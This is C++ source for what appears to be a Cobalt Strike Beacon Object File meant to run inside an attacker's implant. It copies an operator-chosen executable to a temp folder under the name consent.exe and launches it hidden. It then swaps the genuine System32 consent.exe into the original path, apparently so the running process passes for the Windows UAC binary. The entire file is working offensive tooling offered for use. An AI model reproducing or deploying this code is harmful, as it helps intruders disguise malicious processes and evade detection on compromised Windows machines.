#include "Windows.h"
#include "base\helpers.h"

extern "C" {
#include "beacon.h"

    char* generate_uuid() {
        DFR_LOCAL(Rpcrt4, UuidCreate);
        DFR_LOCAL(Rpcrt4, UuidToStringA);
        UUID uuid;
        UuidCreate(&uuid); 
        char* uuid_str = nullptr;
        UuidToStringA(&uuid, (RPC_CSTR*)&uuid_str);  
        return uuid_str;
    }

    void go(char* args, int len) {
        DFR_LOCAL(MSVCRT, strcpy);
        DFR_LOCAL(MSVCRT, strcat);
        DFR_LOCAL(Kernel32, CreateDirectoryA);
        DFR_LOCAL(Kernel32, CopyFileA);
        DFR_LOCAL(Shell32, ShellExecuteA);
        DFR_LOCAL(Kernel32, MoveFileA);

        datap parser;
        BeaconDataParse(&parser, args, len);
        char* target = BeaconDataExtract(&parser, NULL);
        char* parameters = BeaconDataExtract(&parser, NULL);
        BeaconPrintf(CALLBACK_OUTPUT, "target: %s", target);
        BeaconPrintf(CALLBACK_OUTPUT, "parameters: %s", parameters);
        char* uuid_str1 = generate_uuid();
        char fakeDir[128];
        strcpy(fakeDir,"C:\\Windows\\temp\\");
        strcat(fakeDir, uuid_str1);
        CreateDirectoryA(fakeDir, NULL);
        char fakePath[128];
        strcpy(fakePath, fakeDir);
        strcat(fakePath, "\\consent.exe");
        BeaconPrintf(CALLBACK_OUTPUT, "fakePath: %s", fakePath);
        CopyFileA(target, fakePath, FALSE);
        ShellExecuteA(NULL, "open", fakePath, parameters, NULL, 0);
        char* uuid_str2 = generate_uuid();
        char realDir[128];
        strcpy(realDir, "C:\\Windows\\temp\\");
        strcat(realDir, uuid_str2);
        MoveFileA(fakeDir, realDir);
        CreateDirectoryA(fakeDir, NULL);
        CopyFileA("C:\\Windows\\System32\\consent.exe", fakePath, FALSE);
        char realPath[128];
        strcpy(realPath, realDir);
        strcat(realPath, "\\consent.exe");
        BeaconPrintf(CALLBACK_OUTPUT, "realPath: %s", realPath);
    }
}